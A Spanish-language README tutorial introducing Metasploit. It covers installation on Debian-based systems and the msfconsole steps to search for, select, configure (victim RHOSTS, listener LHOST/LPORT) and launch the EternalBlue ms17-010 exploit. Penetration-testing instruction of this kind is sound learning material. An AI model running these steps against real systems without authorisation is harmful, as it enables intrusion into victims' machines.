![45d05b2d7bd477a3cac9786ef8cf6e29](https://user-images.githubusercontent.com/103068924/168299911-cf99878d-756d-4497-91d1-49c0571d278b.png)

# ¿Qué es Metasploit?

Metasploit es un proyecto de código abierto para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad y ayuda en 
tests de penetración `Pentesting` y el desarrollo de firmas para sistemas de detección de intrusos.

Su subproyecto más conocido es el `Metasploit Framework`, una herramienta para desarrollar y ejecutar exploits contra una máquina remota.

Inicialmente, fue creado utilizando el lenguaje de programación de scripting Perl aunque actualmente el Metasploit Framework ha sido escrito de nuevo 
completamente en el lenguaje Ruby.

# ¿Como funciona Metasploit?

Los pasos básicos para la explotación de un sistema que utiliza el Sistema incluyen:

1. La selección y configuración de un código el cual se va a explotar. El cual entra al sistema objetivo, mediante el aprovechamiento de
bugs. Existen cerca de 900 exploits incluidos para Windows, Unix / Linux y Mac OS X.   

2. Opción para comprobar si el sistema destino es susceptible a los bugs elegidos.  

3. La técnica para codificar el sistema de prevención de intrusiones (IPS) e incluir la carga útil codificada.   

4. Visualización a la hora de ejecutar el exploit.

Metasploit se ejecuta en Unix (incluyendo Linux y Mac OS X) y en Windows. El Sistema Metasploit se puede extender y es capaz utilizar complementos 
en varios idiomas.

Para elegir un exploit y la carga útil, se necesita un poco de información sobre el sistema objetivo, como la versión del sistema operativo y los
servicios de red instalados. 

Esta información puede ser obtenida con el escaneo de puertos y "OS fingerprinting", puedes obtener esta información 
con herramientas como Nmap, NeXpose o Nessus, estos programas, pueden detectar vulnerabilidades del sistema de destino. Metasploit puede importar
los datos de la exploración de vulnerabilidades y comparar las vulnerabilidades identificadas.

# Instalación:

Para poder instalar Metasploit en sistemas basados en Debian como Parrot o Kali Linux, primero actualizamos el sistema:

    sudo apt-get update
    
Y luego procedemos con la instalación:

    sudo apt-get install metasploit-framework
     
Una vez instalado podemos ejecutarlo mediante el comando:

    msfconsole
    
![Captura de pantalla -2022-05-13 02-39-06](https://user-images.githubusercontent.com/103068924/168301223-b00a6c4b-9582-42c4-8adf-85b44e3ebfcc.png)
 
# Búsqueda de Exploits:
 
Metasploit cuenta con una gran recopilación de exploits, para poder buscar el adecuado filtrando por la vulnerabilidad que queremos explotar 
simplemente usamos el comando `search` seguido del exploit, la vulnerabilidad o la versión del sistema que vamos a vulnerar. Esto debemos
ejecutarlo una vez hemos ingresado en `msfconsole`:

    search [Información que identifique la vulnerabilidad.]
    
![Captura de pantalla -2022-05-13 13-05-57](https://user-images.githubusercontent.com/103068924/168302351-3f912051-c282-44f8-a783-8ea373f84284.png)

## Conceptos básicos de configuración:

Una vez nos muestra las listas (en este ejemplo hemos buscado la vulnerabilidad ms17-010 conocida como EthernalBlue) de los exploits que contienen
la iformación proporcionada. En mi caso, como he especificado la vulnerabilidad `ms17-'010` los resultados son muy concretos.

Una vez tenemos claro el exploit que deseamos emplear, podemos seleccionarlo mediante `use` seguido o del número de posición en la lista, el directorio o el nombre del mismo exploit.

    use 0
    
![Captura de pantalla -2022-05-13 13-06-25](https://user-images.githubusercontent.com/103068924/168303141-286e5f50-4e31-44b6-93a1-497f1e553a3f.png)

Tras seleccionar el exploit ya solo faltaría configurarlo. Para ver la configuración predeterminada podemos usar el comando `options`.

![Captura de pantalla -2022-05-13 13-26-24](https://user-images.githubusercontent.com/103068924/168303659-f3e2dbc6-913a-48ae-9f0a-e01faf0cd725.png)

Para configurar los parametros simplemente utilizamos `set` seguido del parametro a cambiar. Debemos especificar el  `RHOSTS` donde indicamos la Ip
de la víctima, el `LHOST` donde indicaremos nuestra Ip pública (En caso de emplear una VPN debemos poner la Ip de misma.) y finalmente, indicamos 
el `LPORT` que es el puerto por el cual nos pondremos en escucha.

    set RHOSTS [Ip Víctima]

    set LHOST [Ip Local]
    
    set LPORT [Puerto de Escucha]
    
![Captura de pantalla -2022-05-13 13-25-31](https://user-images.githubusercontent.com/103068924/168304755-70ce4ee5-3ce0-440f-a1ab-8f68ad035dff.png)

Finalmente, una vez lo tenemos todo configurado, ejecutamos la herramienta deseada mediante el comando `exploit`:

    exploit
    
    
---
---
  
    
<html lang="en">
<head>
  
</head>
<body>

<script src="https://utteranc.es/client.js"
    repo="F1r0x/gestion-comentarios"
    issue-term="pathname"
    theme="github-light"
    crossorigin="anonymous"
    async>
</script>
          
    
  </body>
</html>
  
  
---
---


